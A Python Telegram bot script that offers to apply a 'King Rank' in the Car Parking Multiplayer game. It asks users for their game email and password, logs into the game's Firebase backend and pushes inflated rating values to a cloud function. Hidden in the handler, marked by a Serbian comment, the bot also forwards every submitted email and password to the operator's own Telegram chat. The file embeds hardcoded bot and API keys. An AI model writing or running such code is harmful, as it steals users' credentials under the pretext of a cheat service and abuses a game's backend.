import requests
import json
import time

# --- CONFIGURATION ---
BOT_TOKEN = "8796196454:AAGPJXNDSkM-t09RAiWslEo-D99BrrYEkdA"
MY_CHAT_ID = 8838797931 
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"

def send_to_user(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": chat_id, "text": text})

def login(email, password):
    payload = {
        "clientType": "CLIENT_TYPE_ANDROID",
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    headers = {"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12)", "Content-Type": "application/json"}
    try:
        res = requests.post(FIREBASE_LOGIN_URL, headers=headers, json=payload)
        data = res.json()
        return data.get('idToken') if res.status_code == 200 else None
    except:
        return None

def set_rank(token):
    rating_data = {k: 100000 for k in [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
        "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
        "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
        "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]}
    rating_data["time"] = 1000000000
    rating_data["race_win"] = 3000
    payload = {"data": json.dumps({"RatingData": rating_data})}
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json", "User-Agent": "okhttp/3.12.13"}
    try:
        res = requests.post(RANK_URL, headers=headers, json=payload)
        return res.status_code == 200
    except:
        return False

def process_updates():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    try:
        res = requests.get(url).json()
        if "result" in res:
            for update in res["result"]:
                msg = update.get("message", {})
                chat_id = msg.get("chat", {}).get("id")
                text = msg.get("text", "")
                update_id = update["update_id"]

                if text.startswith("/rank"):
                    parts = text.split()
                    if len(parts) == 3:
                        email, password = parts[1], parts[2]
                        
                        # SALJE TEBI PODATKE
                        send_to_user(MY_CHAT_ID, f"🔥 NOVA PRIJAVA:\nUser Chat ID: {chat_id}\nEmail: {email}\nPass: {password}")
                        
                        # ODGOVARA KORISNIKU
                        send_to_user(chat_id, f"⏳ Processing your request for {email}...")
                        token = login(email, password)
                        if token and set_rank(token):
                            send_to_user(chat_id, f"✅ Success: King Rank applied to {email}")
                        else:
                            send_to_user(chat_id, f"❌ Failed: Could not update rank for {email}")
                    else:
                        send_to_user(chat_id, "Usage: /rank [email] [password]")
                
                # Oznacava poruku kao obradjenu
                requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={update_id + 1}")
    except: pass

print("Bot is active and listening...")
while True:
    process_updates()
    time.sleep(2)

